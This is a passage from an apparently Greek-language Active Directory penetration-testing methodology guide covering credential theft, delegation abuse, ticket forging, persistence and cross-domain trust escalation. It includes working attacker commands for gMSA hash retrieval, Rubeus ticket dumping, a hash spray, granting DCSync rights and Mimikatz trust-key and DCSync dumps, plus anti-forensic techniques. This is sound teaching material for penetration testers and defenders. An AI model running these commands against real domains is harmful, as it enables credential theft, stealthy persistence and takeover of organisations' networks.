Μια αποτυχημένη σύνδεση `default/NTLM` **δεν** ακυρώνει αυτό το εύρημα: δοκιμάστε με `-k`, ένα FQDN που επιλύεται στον DC και ένα ρολόι συγχρονισμένο με το KDC. Οι επιτυχημένες εκτελέσεις του module γράφουν λίστες υποψηφίων και αποκτημένα ccaches κάτω από το `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Μετά την παραβίαση του computer principal, χαρτογραφήστε τις εμφωλευμένες συμμετοχές του σε ομάδες και τα outbound δικαιώματά του. Συγκεκριμένα, οι principals που αναφέρονται στον security descriptor `msDS-GroupMSAMembership` ενός gMSA μπορούν να διαβάσουν το `msDS-ManagedPassword`· η έξοδος `--gmsa` του NetExec εμφανίζει τους επιτρεπόμενους principals και επιστρέφει το τρέχον NT hash όταν ο υπολογιστής που κάνει authentication είναι εξουσιοδοτημένος.<sup>[[19]](#references)[[20]](#references)</sup>
```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```
Στη συνέχεια αξιολόγησε το ανακτημένο gMSA όπως οποιοδήποτε άλλο credential: έλεγξε τη συμμετοχή σε local/domain groups, τα δικαιώματα logon, τα SPNs, το delegation και τις προσβάσιμες υπηρεσίες πριν δοκιμάσεις pass-the-hash. Αυτή η ACL-based διαδρομή ανάκτησης διαφέρει από το [Golden gMSA/dMSA](golden-dmsa-gmsa.md), το οποίο παράγει managed passwords μετά την παραβίαση του KDS root-key.<sup>[[20]](#references)</sup>

### Kerberoast

Το Kerberoasting περιλαμβάνει την απόκτηση **TGS tickets** που χρησιμοποιούνται από υπηρεσίες οι οποίες συνδέονται με user accounts και το cracking της κρυπτογράφησής τους — η οποία βασίζεται σε user passwords — **offline**.

Περισσότερα σχετικά με αυτό:

{{#ref}}
kerberoast.md
{{#endref}}

### Απομακρυσμένη σύνδεση (RDP, SSH, FTP, Win-RM, κ.λπ.)

Μόλις αποκτήσεις κάποια credentials, μπορείς να ελέγξεις αν έχεις πρόσβαση σε κάποιο **machine**. Για αυτόν τον σκοπό, μπορείς να χρησιμοποιήσεις το **CrackMapExec** ώστε να προσπαθήσεις να συνδεθείς σε αρκετούς servers με διαφορετικά protocols, σύμφωνα με τα port scans σου.

### Local Privilege Escalation

Αν έχεις παραβιασμένα credentials ή session ως regular domain user και μπορείς να αποκτήσεις πρόσβαση σε **οποιοδήποτε machine στο domain**, αναζήτησε μια διαδρομή για **local privilege escalation και συλλογή credentials**. Τα local administrator privileges μπορεί να σου επιτρέψουν να κάνεις **dump τα hashes άλλων users** από τη μνήμη (LSASS) και το local storage (SAM).

Υπάρχει πλήρης σελίδα σε αυτό το βιβλίο σχετικά με το [**local privilege escalation στα Windows**](../windows-local-privilege-escalation/index.html) και ένα [**checklist**](../checklist-windows-privilege-escalation.md). Επίσης, μην ξεχάσεις να χρησιμοποιήσεις το [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Current Session Tickets

Είναι πολύ **απίθανο** να βρεις **tickets** στον τρέχοντα user που να σου **δίνουν permission για πρόσβαση** σε μη αναμενόμενους πόρους, αλλά μπορείς να ελέγξεις:
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

Με credentials domain ή με user session, επανεξετάστε τις [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: οι authenticated τεχνικές enumeration και coercion μπορούν να αποκαλύψουν relay paths που δεν ήταν διαθέσιμα κατά το unauthenticated reconnaissance.

### Αναζήτηση Creds σε Computer Shares | SMB Shares

Τώρα που έχετε κάποια βασικά credentials, θα πρέπει να ελέγξετε αν μπορείτε να **βρείτε** **ενδιαφέροντα αρχεία που διαμοιράζονται μέσα στο AD**. Θα μπορούσατε να το κάνετε χειροκίνητα, αλλά είναι μια πολύ βαρετή και επαναλαμβανόμενη εργασία (και ακόμη περισσότερο αν βρείτε εκατοντάδες docs που πρέπει να ελέγξετε).

[**Ακολουθήστε αυτόν τον σύνδεσμο για να μάθετε σχετικά με τα εργαλεία που θα μπορούσατε να χρησιμοποιήσετε.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Κλοπή NTLM Creds

Αν μπορείτε να **έχετε πρόσβαση σε άλλα PCs ή shares**, θα μπορούσατε να **τοποθετήσετε αρχεία** (όπως ένα αρχείο SCF) τα οποία, αν προσπελαστούν με κάποιον τρόπο, θα **προκαλέσουν NTLM authentication προς εσάς**, ώστε να μπορέσετε να **κλέψετε** το **NTLM challenge** για να το κάνετε crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Αυτή η ευπάθεια επέτρεπε σε οποιονδήποτε authenticated user να **compromise τον domain controller**.


{{#ref}}
printnightmare.md
{{#endref}}

## Privilege escalation στο Active Directory ΜΕ privileged credentials/session

**Για τις ακόλουθες τεχνικές, ένας regular domain user δεν αρκεί· χρειάζεστε κάποια ειδικά privileges/credentials για να εκτελέσετε αυτές τις attacks.**

### Εξαγωγή hash

Ελπίζουμε να έχετε καταφέρει να **compromise κάποιον local admin** account χρησιμοποιώντας [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), συμπεριλαμβανομένου του relaying, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html).\
Έπειτα, είναι ώρα να κάνετε dump όλα τα hashes στη μνήμη και τοπικά.\
[**Διαβάστε αυτήν τη σελίδα σχετικά με τους διαφορετικούς τρόπους απόκτησης των hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Μόλις αποκτήσετε το hash ενός user**, μπορείτε να το χρησιμοποιήσετε για να **τον impersonate**.\
Χρειάζεται να χρησιμοποιήσετε κάποιο **tool** που θα **εκτελέσει** το **NTLM authentication χρησιμοποιώντας** αυτό το **hash**, **ή** θα μπορούσατε να δημιουργήσετε ένα νέο **sessionlogon** και να **inject** αυτό το **hash** μέσα στο **LSASS**, ώστε όταν εκτελείται οποιοδήποτε **NTLM authentication**, να χρησιμοποιείται αυτό το **hash**. Η τελευταία επιλογή είναι αυτή που κάνει το mimikatz.\
[**Διαβάστε αυτήν τη σελίδα για περισσότερες πληροφορίες.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Αυτή η attack στοχεύει στη **χρήση του NTLM hash του user για την αίτηση Kerberos tickets**, ως εναλλακτική στο συνηθισμένο Pass The Hash μέσω του NTLM protocol. Επομένως, αυτό μπορεί να είναι ιδιαίτερα **χρήσιμο σε networks όπου το NTLM protocol είναι απενεργοποιημένο** και επιτρέπεται μόνο το **Kerberos** ως authentication protocol.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

Στη μέθοδο attack **Pass The Ticket (PTT)**, οι attackers **κλέβουν το authentication ticket ενός user** αντί για τον κωδικό πρόσβασης ή τις τιμές hash του. Αυτό το κλεμμένο ticket χρησιμοποιείται στη συνέχεια για να **γίνει impersonate ο user**, αποκτώντας μη εξουσιοδοτημένη πρόσβαση σε resources και services μέσα σε ένα network.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Επαναχρησιμοποίηση Credentials

Αν έχετε το **hash** ή το **password** ενός **local administrator**, θα πρέπει να προσπαθήσετε να κάνετε **login locally** σε άλλα **PCs** με αυτό.
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> Σημειώστε ότι αυτό είναι αρκετά **noisy** και το **LAPS** θα το **mitigate**.

### Κατάχρηση MSSQL & Trusted Links

Εάν ένας χρήστης έχει δικαιώματα να **access MSSQL instances**, θα μπορούσε να τα χρησιμοποιήσει για να **execute commands** στο MSSQL host (εάν εκτελείται ως SA), να **steal** το NetNTLM **hash** ή ακόμη και να πραγματοποιήσει **relay** **attack**.\
Εάν ένα MSSQL instance είναι trusted μέσω ενός database link από ένα άλλο instance, ένας χρήστης με δικαιώματα στη linked database ενδέχεται να μπορεί να **χρησιμοποιήσει τη σχέση εμπιστοσύνης για να εκτελέσει queries στο άλλο instance**. Αυτές οι σχέσεις εμπιστοσύνης μπορούν να αλυσιδωθούν και ενδέχεται τελικά να φτάσουν σε μια misconfigured database όπου ο χρήστης μπορεί να εκτελέσει commands.\
**Τα links μεταξύ databases λειτουργούν ακόμη και μέσω forest trusts.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Κατάχρηση IT asset/deployment platforms

Οι third-party inventory και deployment suites συχνά εκθέτουν ισχυρές διαδρομές προς credentials και code execution. Δείτε:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

Εάν βρείτε οποιοδήποτε Computer object με το attribute [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) και έχετε domain privileges στον computer, θα μπορείτε να κάνετε dump TGTs από τη μνήμη κάθε χρήστη που κάνει login στον computer.\
Επομένως, εάν ένας **Domain Admin κάνει login στον computer**, θα μπορείτε να κάνετε dump το TGT του και να τον impersonate χρησιμοποιώντας [Pass the Ticket](pass-the-ticket.md).\
Χάρη στο constrained delegation θα μπορούσατε ακόμη και να **compromise αυτόματα έναν Print Server** (ελπίζουμε ότι θα είναι DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Εάν ένας user ή computer επιτρέπεται για "Constrained Delegation", θα μπορεί να **impersonate οποιονδήποτε user για να αποκτήσει πρόσβαση σε ορισμένες services ενός computer**.\
Στη συνέχεια, εάν **compromise το hash** αυτού του user/computer, θα μπορείτε να **impersonate οποιονδήποτε user** (ακόμη και domain admins) για να αποκτήσετε πρόσβαση σε ορισμένες services.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Η κατοχή privilege **WRITE** σε ένα Active Directory object ενός remote computer επιτρέπει την επίτευξη code execution με **elevated privileges**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Κατάχρηση Permissions/ACLs

Ο compromised user ενδέχεται να έχει **ενδιαφέροντα privileges σε ορισμένα domain objects**, τα οποία θα μπορούσαν να σας επιτρέψουν να κάνετε **lateral move**/**escalate** privileges.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Κατάχρηση Printer Spooler service

Η ανακάλυψη ενός **Spool service που κάνει listening** μέσα στο domain μπορεί να γίνει **abused** για την **απόκτηση νέων credentials** και το **escalate privileges**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Κατάχρηση third-party sessions

Εάν **άλλοι χρήστες** κάνουν **access** στο **compromised** machine, είναι δυνατό να **συλλέξετε credentials από τη μνήμη** και ακόμη και να **inject beacons στις processes τους** για να τους impersonate.\
Συνήθως οι χρήστες κάνουν access στο σύστημα μέσω RDP, επομένως εδώ θα βρείτε πώς να εκτελέσετε μερικά attacks σε third-party RDP sessions:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

Το **LAPS** παρέχει ένα σύστημα για τη διαχείριση του **local Administrator password** σε domain-joined computers, διασφαλίζοντας ότι είναι **randomized**, μοναδικό και **αλλάζει** συχνά. Αυτά τα passwords αποθηκεύονται στο Active Directory και η πρόσβαση ελέγχεται μέσω ACLs μόνο για εξουσιοδοτημένους χρήστες. Με επαρκή permissions για την πρόσβαση σε αυτά τα passwords, γίνεται δυνατή η μετακίνηση σε άλλους computers.


{{#ref}}
laps.md
{{#endref}}

### Κλοπή Certificates

Η **συλλογή certificates** από το compromised machine θα μπορούσε να αποτελέσει τρόπο για το escalate privileges μέσα στο περιβάλλον:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Κατάχρηση Certificate Templates

Εάν έχουν ρυθμιστεί **vulnerable templates**, είναι δυνατό να γίνει abuse για το escalate privileges:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation με λογαριασμό υψηλών privileges

### Dumping Domain Credentials

Μόλις αποκτήσετε privileges **Domain Admin** ή, ακόμη καλύτερα, **Enterprise Admin**, μπορείτε να κάνετε **dump** το **domain database**: _ntds.dit_.

[**Περισσότερες πληροφορίες σχετικά με το DCSync attack μπορείτε να βρείτε εδώ**](dcsync.md).

[**Περισσότερες πληροφορίες σχετικά με το πώς να κάνετε steal το NTDS.dit μπορείτε να βρείτε εδώ**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc ως Persistence

Ορισμένες από τις τεχνικές που αναφέρθηκαν προηγουμένως μπορούν να χρησιμοποιηθούν για persistence.\
Για παράδειγμα, θα μπορούσατε να:

- Κάνετε τους χρήστες vulnerable σε [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Κάνετε τους χρήστες vulnerable σε [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Παραχωρήσετε privileges [**DCSync**](#dcsync) σε έναν user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Το **Silver Ticket attack** δημιουργεί ένα **legitimate Ticket Granting Service (TGS) ticket** για μια συγκεκριμένη service, χρησιμοποιώντας το **NTLM hash** (για παράδειγμα, το **hash του PC account**). Αυτή η μέθοδος χρησιμοποιείται για την **πρόσβαση στα service privileges**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ένα **Golden Ticket attack** περιλαμβάνει την απόκτηση από έναν attacker του **NTLM hash του krbtgt account** σε ένα περιβάλλον Active Directory (AD). Αυτό το account είναι ειδικό, επειδή χρησιμοποιείται για την υπογραφή όλων των **Ticket Granting Tickets (TGTs)**, τα οποία είναι απαραίτητα για authentication μέσα στο AD network.

Μόλις ο attacker αποκτήσει αυτό το hash, μπορεί να δημιουργήσει **TGTs** για οποιοδήποτε account επιλέξει (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Αυτά μοιάζουν με golden tickets που έχουν forged με τρόπο ο οποίος **παρακάμπτει τους συνήθεις μηχανισμούς detection των golden tickets.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Η κατοχή certificates ενός account ή η δυνατότητα request τους** είναι ένας πολύ καλός τρόπος για να παραμείνετε persistent στο account του user (ακόμη και αν αλλάξει το password):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Η χρήση certificates επιτρέπει επίσης persistence με υψηλά privileges μέσα στο domain:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Το **AdminSDHolder** object στο Active Directory διασφαλίζει την ασφάλεια των **privileged groups** (όπως οι Domain Admins και Enterprise Admins), εφαρμόζοντας ένα τυπικό **Access Control List (ACL)** σε αυτές τις ομάδες, ώστε να αποτρέπει μη εξουσιοδοτημένες αλλαγές. Ωστόσο, αυτή η λειτουργία μπορεί να γίνει exploit· εάν ένας attacker τροποποιήσει το ACL του AdminSDHolder ώστε να δώσει πλήρη πρόσβαση σε έναν κανονικό user, ο user αυτός αποκτά εκτεταμένο έλεγχο σε όλα τα privileged groups. Επομένως, αυτό το μέτρο ασφαλείας, το οποίο προορίζεται για προστασία, μπορεί να έχει αντίθετο αποτέλεσμα και να επιτρέψει ανεπιθύμητη πρόσβαση, εάν δεν παρακολουθείται στενά.

[**Περισσότερες πληροφορίες σχετικά με το AdminDSHolder Group εδώ.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Μέσα σε κάθε **Domain Controller (DC)** υπάρχει ένας λογαριασμός **local administrator**. Αποκτώντας admin rights σε ένα τέτοιο machine, το local Administrator hash μπορεί να εξαχθεί χρησιμοποιώντας το **mimikatz**. Στη συνέχεια, απαιτείται τροποποίηση του registry για να **ενεργοποιηθεί η χρήση αυτού του password**, επιτρέποντας remote access στο local Administrator account.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Θα μπορούσατε να **δώσετε** ορισμένα **ειδικά permissions** σε έναν **user** πάνω σε συγκεκριμένα domain objects, τα οποία θα του επιτρέψουν να **escalate privileges στο μέλλον**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Τα **security descriptors** χρησιμοποιούνται για την **αποθήκευση των permissions** που διαθέτει ένα **object** πάνω σε ένα άλλο **object**. Εάν μπορείτε απλώς να κάνετε **μια μικρή αλλαγή** στο **security descriptor** ενός object, μπορείτε να αποκτήσετε πολύ ενδιαφέροντα privileges πάνω σε αυτό το object, χωρίς να χρειάζεται να είστε μέλος ενός privileged group.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Κάντε abuse την auxiliary class `dynamicObject` για να δημιουργήσετε short-lived principals/GPOs/DNS records με `entryTTL`/`msDS-Entry-Time-To-Die`; αυτά διαγράφονται μόνα τους χωρίς tombstones, διαγράφοντας LDAP evidence, ενώ αφήνουν orphan SIDs, broken `gPLink` references ή cached DNS responses (π.χ. AdminSDHolder ACE pollution ή κακόβουλα `gPCFileSysPath`/AD-integrated DNS redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Τροποποιήστε το **LSASS** στη μνήμη για να δημιουργήσετε ένα **universal password**, παρέχοντας πρόσβαση σε όλα τα domain accounts.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Μάθετε τι είναι ένα SSP (Security Support Provider) εδώ.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Μπορείτε να δημιουργήσετε το **δικό σας SSP** για να **capture** σε **clear text** τα **credentials** που χρησιμοποιούνται για την πρόσβαση στο machine.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Καταχωρίζει έναν **νέο Domain Controller** στο AD και τον χρησιμοποιεί για να **push attributes** (SIDHistory, SPNs...) σε καθορισμένα objects, **χωρίς να αφήνει logs** σχετικά με τις **τροποποιήσεις**. Χρειάζεστε privileges DA και πρέπει να βρίσκεστε μέσα στο **root domain**.\
Σημειώστε ότι εάν χρησιμοποιήσετε λανθασμένα δεδομένα, θα εμφανιστούν ιδιαίτερα άσχημα logs.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Προηγουμένως συζητήσαμε πώς να κάνετε escalate privileges εάν έχετε **αρκετά permissions για να διαβάζετε LAPS passwords**. Ωστόσο, αυτά τα passwords μπορούν επίσης να χρησιμοποιηθούν για τη **διατήρηση persistence**.\
Δείτε:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Η Microsoft θεωρεί το **Forest** ως το security boundary. Αυτό σημαίνει ότι το **compromising** ενός domain θα μπορούσε δυνητικά να οδηγήσει σε compromise ολόκληρου του **Forest**.<sup>[[1]](#references)</sup>

### Βασικές πληροφορίες

Ένα [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) είναι ένας μηχανισμός ασφαλείας που επιτρέπει σε έναν user από ένα **domain** να αποκτήσει πρόσβαση σε resources ενός άλλου **domain**. Ουσιαστικά δημιουργεί μια σύνδεση μεταξύ των authentication systems των δύο domains, επιτρέποντας στις authentication verifications να ρέουν ομαλά. Όταν τα domains δημιουργούν ένα trust, ανταλλάσσουν και διατηρούν συγκεκριμένα **keys** στους **Domain Controllers (DCs)** τους, τα οποία είναι κρίσιμα για την ακεραιότητα του trust.

Σε ένα τυπικό σενάριο, εάν ένας user θέλει να αποκτήσει πρόσβαση σε μια service σε ένα **trusted domain**, πρέπει πρώτα να ζητήσει ένα ειδικό ticket, γνωστό ως **inter-realm TGT**, από το DC του δικού του domain. Αυτό το TGT είναι encrypted με ένα shared **key** που έχουν συμφωνήσει και τα δύο domains. Στη συνέχεια, ο user παρουσιάζει αυτό το TGT στον **DC του trusted domain** για να λάβει ένα service ticket (**TGS**). Μετά την επιτυχή validation του inter-realm TGT από τον DC του trusted domain, αυτός εκδίδει ένα TGS, παρέχοντας στον user πρόσβαση στη service.

**Βήματα**:

1. Ένας **client computer** στο **Domain 1** ξεκινά τη διαδικασία χρησιμοποιώντας το **NTLM hash** του για να ζητήσει ένα **Ticket Granting Ticket (TGT)** από το **Domain Controller (DC1)** του.
2. Το DC1 εκδίδει ένα νέο TGT, εάν ο client authenticated επιτυχώς.
3. Στη συνέχεια, ο client ζητά ένα **inter-realm TGT** από το DC1, το οποίο απαιτείται για την πρόσβαση σε resources στο **Domain 2**.
4. Το inter-realm TGT είναι encrypted με ένα **trust key** που μοιράζονται τα DC1 και DC2 στο πλαίσιο του two-way domain trust.
5. Ο client μεταφέρει το inter-realm TGT στον **Domain Controller (DC2) του Domain 2**.
6. Το DC2 επαληθεύει το inter-realm TGT χρησιμοποιώντας το shared trust key του και, εάν είναι valid, εκδίδει ένα **Ticket Granting Service (TGS)** για τον server στο Domain 2 στον οποίο θέλει να αποκτήσει πρόσβαση ο client.
7. Τέλος, ο client παρουσιάζει αυτό το TGS στον server, το οποίο είναι encrypted με το account hash του server, για να αποκτήσει πρόσβαση στη service στο Domain 2.

### Διαφορετικά trusts

Είναι σημαντικό να σημειωθεί ότι **ένα trust μπορεί να είναι 1-way ή 2-way**. Στην επιλογή 2-way, και τα δύο domains κάνουν trust το ένα στο άλλο, αλλά στη σχέση **1-way** trust το ένα domain θα είναι το **trusted** και το άλλο το **trusting** domain. Στην τελευταία περίπτωση, **θα μπορείτε να αποκτήσετε πρόσβαση σε resources μέσα στο trusting domain μόνο από το trusted domain**.

Εάν το Domain A κάνει trust το Domain B, το A είναι το trusting domain και το B το trusted. Επιπλέον, στο **Domain A**, αυτό θα είναι ένα **Outbound trust**· ενώ στο **Domain B**, θα είναι ένα **Inbound trust**.

**Διαφορετικές trusting relationships**

- **Parent-Child Trusts**: Πρόκειται για μια συνηθισμένη ρύθμιση μέσα στο ίδιο forest, όπου ένα child domain έχει αυτόματα two-way transitive trust με το parent domain του. Ουσιαστικά, αυτό σημαίνει ότι τα authentication requests μπορούν να ρέουν ομαλά μεταξύ parent και child.
- **Cross-link Trusts**: Γνωστά ως "shortcut trusts", δημιουργούνται μεταξύ child domains για την επιτάχυνση των referral processes. Σε σύνθετα forests, τα authentication referrals συνήθως πρέπει να ανέβουν έως το forest root και μετά να κατέβουν στο target domain. Με τη δημιουργία cross-links, η διαδρομή συντομεύεται, κάτι ιδιαίτερα χρήσιμο σε γεωγραφικά κατανεμημένα περιβάλλοντα.
- **External Trusts**: Δημιουργούνται μεταξύ διαφορετικών, μη συνδεδεμένων domains και είναι από τη φύση τους non-transitive. Σύμφωνα με την [τεκμηρίωση της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), τα external trusts είναι χρήσιμα για πρόσβαση σε resources σε ένα domain εκτός του τρέχοντος forest, το οποίο δεν συνδέεται μέσω forest trust. Η ασφάλεια ενισχύεται μέσω SID filtering με external trusts.
- **Tree-root Trusts**: Αυτά τα trusts δημιουργούνται αυτόματα μεταξύ του forest root domain και ενός newly added tree root. Αν και δεν συναντώνται συχνά, τα tree-root trusts είναι σημαντικά για την προσθήκη νέων domain trees σε ένα forest, επιτρέποντάς τους να διατηρούν ένα μοναδικό domain name και διασφαλίζοντας two-way transitivity. Περισσότερες πληροφορίες μπορείτε να βρείτε στον [οδηγό της Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Αυτός ο τύπος trust είναι ένα two-way transitive trust μεταξύ δύο forest root domains και επιβάλλει επίσης SID filtering για την ενίσχυση των μέτρων ασφαλείας.
- **MIT Trusts**: Αυτά τα trusts δημιουργούνται με non-Windows, [RFC4120-compliant](https://tools.ietf.org/html/rfc4120) Kerberos domains. Τα MIT trusts είναι κάπως πιο εξειδικευμένα και απευθύνονται σε περιβάλλοντα που απαιτούν integration με Kerberos-based systems εκτός του Windows ecosystem.

#### Άλλες διαφορές στις **trusting relationships**

- Μια trust relationship μπορεί επίσης να είναι **transitive** (το A εμπιστεύεται το B, το B εμπιστεύεται το C, επομένως το A εμπιστεύεται το C) ή **non-transitive**.
- Μια trust relationship μπορεί να ρυθμιστεί ως **bidirectional trust** (και τα δύο εμπιστεύονται το ένα το άλλο) ή ως **one-way trust** (μόνο το ένα εμπιστεύεται το άλλο).

### Attack Path

1. Κάντε **enumerate** τις trusting relationships
2. Ελέγξτε εάν οποιοδήποτε **security principal** (user/group/computer) έχει **access** σε resources του **άλλου domain**, πιθανώς μέσω ACE entries ή επειδή βρίσκεται σε groups του άλλου domain. Αναζητήστε **relationships μεταξύ domains** (πιθανότατα για αυτό δημιουργήθηκε το trust).
1. Το kerberoast θα μπορούσε σε αυτή την περίπτωση να είναι μια ακόμη επιλογή.
3. Κάντε **compromise** τα **accounts** που μπορούν να κάνουν **pivot** μεταξύ domains.

Attackers με πρόσβαση σε resources ενός άλλου domain μέσω τριών βασικών μηχανισμών:

- **Local Group Membership**: Principals μπορεί να έχουν προστεθεί σε local groups σε machines, όπως το “Administrators” group ενός server, παρέχοντάς τους σημαντικό έλεγχο πάνω σε αυτό το machine.
- **Foreign Domain Group Membership**: Principals μπορούν επίσης να είναι members groups μέσα στο foreign domain. Ωστόσο, η αποτελεσματικότητα αυτής της μεθόδου εξαρτάται από τη φύση του trust και το scope του group.
- **Access Control Lists (ACLs)**: Principals μπορεί να καθορίζονται σε ένα **ACL**, ιδιαίτερα ως entities σε **ACEs** μέσα σε ένα **DACL**, παρέχοντάς τους πρόσβαση σε συγκεκριμένα resources. Για όσους θέλουν να εμβαθύνουν στους μηχανισμούς των ACLs, DACLs και ACEs, το whitepaper με τίτλο “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” αποτελεί ανεκτίμητο resource.<sup>[[17]](#references)</sup>

### Εύρεση external users/groups με permissions

Μπορείτε να ελέγξετε το **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** για να βρείτε foreign security principals στο domain. Αυτοί θα είναι user/group από **external domain/forest**.

Μπορείτε να το ελέγξετε στο **Bloodhound** ή χρησιμοποιώντας το powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Κλιμάκωση προνομίων από Child σε Parent forest
```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Άλλοι τρόποι για την απαρίθμηση των domain trusts:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Υπάρχουν **2 trusted keys**, μία για _Child --> Parent_ και μία άλλη για _Parent_ --> _Child_.\
> Μπορείτε να βρείτε αυτήν που χρησιμοποιείται από το τρέχον domain με:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Κλιμακώστε τα δικαιώματά σας σε Enterprise admin στο child/parent domain, εκμεταλλευόμενοι το trust με SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Εκμετάλλευση writeable Configuration NC

Η κατανόηση του τρόπου με τον οποίο μπορεί να γίνει εκμετάλλευση του Configuration Naming Context (NC) είναι κρίσιμη. Το Configuration NC λειτουργεί ως κεντρικό αποθετήριο για δεδομένα configuration σε ένα forest σε περιβάλλοντα Active Directory (AD). Αυτά τα δεδομένα αναπαράγονται σε κάθε Domain Controller (DC) μέσα στο forest, ενώ οι writable DC διατηρούν ένα writable αντίγραφο του Configuration NC. Για την εκμετάλλευσή του, απαιτούνται **SYSTEM privileges σε έναν DC**, κατά προτίμηση σε έναν child DC.

**Σύνδεση GPO με το root DC site**

Το Sites container του Configuration NC περιλαμβάνει πληροφορίες σχετικά με τα sites όλων των domain-joined υπολογιστών μέσα στο AD forest. Έχοντας SYSTEM privileges σε οποιονδήποτε DC, οι attackers μπορούν να συνδέσουν GPOs με τα root DC sites. Αυτή η ενέργεια μπορεί να θέσει σε κίνδυνο το root domain μέσω της τροποποίησης των policies που εφαρμόζονται σε αυτά τα sites.

